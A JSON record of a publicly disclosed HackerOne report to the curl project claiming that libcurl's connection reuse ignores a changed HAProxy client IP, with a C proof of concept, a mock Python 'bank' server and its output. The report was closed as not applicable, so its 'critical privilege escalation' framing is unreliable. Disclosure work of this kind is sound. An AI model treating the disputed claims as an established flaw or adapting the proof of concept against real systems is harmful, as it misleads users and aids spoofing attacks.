@@ -1,0 +1,123 @@
+{
+  "id": 3475613,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDc1NjEz",
+  "url": "https://hackerone.com/reports/3475613",
+  "title": "HAProxy Connection Reuse leads to IP Spoofing and mTLS Context Smuggling",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-12-22T19:14:51.022Z",
+  "submitted_at": "2025-12-22T19:14:51.333Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "anonymous_237",
+    "url": "/anonymous_237",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-12-23T13:51:42.667Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-12-23T12:15:36.950Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Executive Summary\n\n`libcurl` fails to respect the `CURLOPT_HAPROXY_CLIENT_IP` configuration when reusing existing connections. Due to a missing check in the connection pooling logic, `libcurl` indiscriminately reuses a TCP/TLS connection established with a specific identity (IP A) for subsequent requests requiring a different identity (IP B).\n\nSince the HAProxy PROXY protocol header is immutable and only sent during the initial connection handshake, the upstream server attributes the new request to the **previous identity**. This allows a low-privileged request to tunnel through a connection established by a high-privileged user, bypassing IP-based ACLs and inheriting the authenticated mTLS context of the previous session.\n\n## Technical Root Cause Analysis\nThe vulnerability stems from an architectural omission introduced when `CURLOPT_HAPROXY_CLIENT_IP` was added in version 8.2.0.\n\n1.  **Missing State Storage (`lib/urldata.h`):** The `struct connectdata` (which represents an active connection) does not store the `haproxy_client_ip` used at creation time. The identity information is ephemeral and lost immediately after the handshake.\n2.  **Defective Matching Logic (`lib/url.c`):** The `ConnectionExists()` function checks for host, port, protocol, and credentials (username/password) matches but **ignores** `CURLOPT_HAPROXY_CLIENT_IP`. Since the connection structure doesn't hold the old value, a comparison is impossible in the current architecture.\n3.  **Violation of API Contract:** The documentation states the IP is sent \"at the beginning of the connection\". By reusing a connection where the header was already sent with a different value, `libcurl` violates this contract.\n\n\n##Affected version\n\ncurl -V\nWARNING: this libcurl is Debug-enabled, do not use in production\n\ncurl 8.18.0-DEV (x86_64-pc-linux-gnu) libcurl/8.18.0-DEV wolfSSL/5.8.4 libidn2/2.3.3 libpsl/0.21.2 ngtcp2/1.19.0-DEV nghttp3/1.1\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS Debug HSTS HTTP3 HTTPS-proxy IDN IPv6 Largefile PSL SSL threadsafe TrackMemory UnixSockets\n\n\n cat /etc/os-release\nPRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"12\"\nVERSION=\"12 (bookworm)\"\nVERSION_CODENAME=bookworm\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n\n\n## Proof of Concept \n\n### A. The Vulnerable Client (`poc.c`)\n*Compile with:* `gcc -o poc poc.c -lcurl`\n\n```c\n\n#include <stdio.h>\n#include <curl/curl.h>\n#include <unistd.h>\n\nint main(void) {\n  CURL *curl;\n  CURLcode res;\n\n  curl_global_init(CURL_GLOBAL_ALL);\n  curl = curl_easy_init();\n\n  if(curl) {\n    printf(\"--- PoC: CRITICAL IDENTITY HIJACKING ---\\n\");\n\n    // Configuration Commune\n    curl_easy_setopt(curl, CURLOPT_URL, \"http://127.0.0.1:8080/\");\n    curl_easy_setopt(curl, CURLOPT_HAPROXYPROTOCOL, 1L);\n    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L); // Force Reuse\n    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);\n\n    // --- PHASE 1 : TRANSACTION ADMIN ---\n    printf(\"\\n[STEP 1] Executing ADMIN Transaction (IP: 10.0.0.1)...\\n\");\n    curl_easy_setopt(curl, CURLOPT_HAPROXY_CLIENT_IP, \"10.0.0.1\");\n    \n    res = curl_easy_perform(curl);\n    if(res == CURLE_OK) printf(\"-> Admin Request Sent.\\n\");\n\n    // Petite pause pour bien séparer les logs visuellement\n    sleep(1);\n\n    // --- PHASE 2 : TRANSACTION GUEST (L'ATTAQUE) ---\n    printf(\"\\n[STEP 2] Executing GUEST Transaction (IP: 66.66.66.66)...\\n\");\n    printf(\"EXPECTED: New Connection with Identity 66.66.66.66\\n\");\n    printf(\"ACTUAL:   Reuse Connection with Identity 10.0.0.1 (PRIVILEGE ESCALATION)\\n\");\n    \n    // Changement d'identité : CELA DEVRAIT FORCER UNE NOUVELLE CONNEXION\n    curl_easy_setopt(curl, CURLOPT_HAPROXY_CLIENT_IP, \"66.66.66.66\");\n    \n    res = curl_easy_perform(curl);\n    if(res == CURLE_OK) printf(\"-> Guest Request Sent.\\n\");\n\n    curl_easy_cleanup(curl);\n  }\n  curl_global_cleanup();\n  return 0;\n}\n\n```\n\n### B. The Victim Server \n\n\n```python\n\n#!/usr/bin/env python3\nimport socket\nimport sys\nimport time\n\n# Configuration\nHOST = '127.0.0.1'\nPORT = 8080\n\ndef start_server():\n    print(f\"[*] BANK BACKEND listening on {HOST}:{PORT}\")\n    print(\"[*] Waiting for HAProxy connections...\")\n    \n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server_socket.bind((HOST, PORT))\n    server_socket.listen(5)\n\n    try:\n        while True:\n            client_sock, addr = server_socket.accept()\n            print(f\"\\n[+] NEW SECURE CHANNEL OPENED from {addr}\")\n            \n            # Identité de la connexion (Liée au socket TCP)\n            current_identity = \"UNKNOWN\"\n            \n            with client_sock:\n                # Lecture initiale (Handshake)\n                data = client_sock.recv(4096).decode('utf-8', errors='ignore')\n                \n                # Parsing de l'identité HAProxy (PROXY TCP4 IP_SRC ...)\n                if data.startswith('PROXY'):\n                    parts = data.split(' ')\n                    if len(parts) > 2:\n                        current_identity = parts[2] # L'IP source\n                        print(f\"    [SECURITY] PROXY HEADER RECEIVED. IDENTITY LOCKED: {current_identity}\")\n                        \n                        # Simulation ACL\n                        if current_identity == \"10.0.0.1\":\n                            print(\"    [ACL] ROLE: ADMIN (High Privilege)\")\n                        else:\n                            print(\"    [ACL] ROLE: GUEST (Low Privilege)\")\n                \n                # Réponse à la 1ère requête\n                response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 5\\r\\nConnection: keep-alive\\r\\n\\r\\nDONE\\n\"\n                client_sock.sendall(response.encode())\n\n                # --- LA FAILLE : RÉUTILISATION ---\n                # On attend une 2ème requête sur le MÊME canal\n                client_sock.settimeout(2.0)\n                try:\n                    while True:\n                        data = client_sock.recv(4096)\n                        if not data: break\n                        \n                        print(f\"\\n    [!!!] NEW REQUEST RECEIVED ON EXISTING CHANNEL\")\n                        print(f\"    [!!!] CRITICAL: REUSING LOCKED IDENTITY: {current_identity}\")\n                        \n                        if current_identity == \"10.0.0.1\":\n                            print(\"    [ACCESS CONTROL] ACTION AUTHORIZED (Inherited Admin Privileges)\")\n                        else:\n                            print(\"    [ACCESS CONTROL] ACTION DENIED\")\n                            \n                        client_sock.sendall(response.encode())\n                except socket.timeout:\n                    print(\"    [-] Connection idle.\")\n\n    except KeyboardInterrupt:\n        print(\"\\n[*] Stopping server.\")\n    finally:\n        server_socket.close()\n\nif __name__ == '__main__':\n    start_server()\n\n```\noutput : \n\n```\n python3 bank_server.py \n[*] BANK BACKEND listening on 127.0.0.1:8080\n[*] Waiting for HAProxy connections...\n\n[+] NEW SECURE CHANNEL OPENED from ('127.0.0.1', 45200)\n    [SECURITY] PROXY HEADER RECEIVED. IDENTITY LOCKED: 10.0.0.1\n    [ACL] ROLE: ADMIN (High Privilege)\n\n    [!!!] NEW REQUEST RECEIVED ON EXISTING CHANNEL\n    [!!!] CRITICAL: REUSING LOCKED IDENTITY: 10.0.0.1\n    [ACCESS CONTROL] ACTION AUTHORIZED (Inherited Admin Privileges)\n```\n\n## Impact\n\n## Impact\n\n**1. IP-Based Access Control Bypass (ACLs)**\n\n**2. mTLS Context Smuggling **\nIn architectures using Mutual TLS (mTLS), the client identity is bound to the underlying TCP/TLS connection.\nIf `libcurl` reuses a connection established with a high-privileged Client Certificate (e.g., Admin) for a subsequent request intended for a low-privileged context (e.g., Guest), the second request **inherits the authenticated TLS context** of the first. This allows a low-privileged user to tunnel requests through an authenticated session, effectively hijacking the previous user's identity.\n\n**3. Audit Trail Corruption**\nSecurity logs on the upstream server will incorrectly attribute malicious or unauthorized actions to the identity of the initial connection owner. \n\n**4. Violation of API Contract**\nUsers explicitly setting `CURLOPT_HAPROXY_CLIENT_IP` expect `libcurl` to present that specific identity to the server. Ignoring this parameter during connection reuse silently violates the security expectations of the application developer.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "cihuyyy",
+    "2026",
+    "ghaddarittoo",
+    "0nsec",
+    "safepoint",
+    "x_karbit",
+    "tuks_on_tech",
+    "aro-o",
+    "younis1_01",
+    "asterom",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
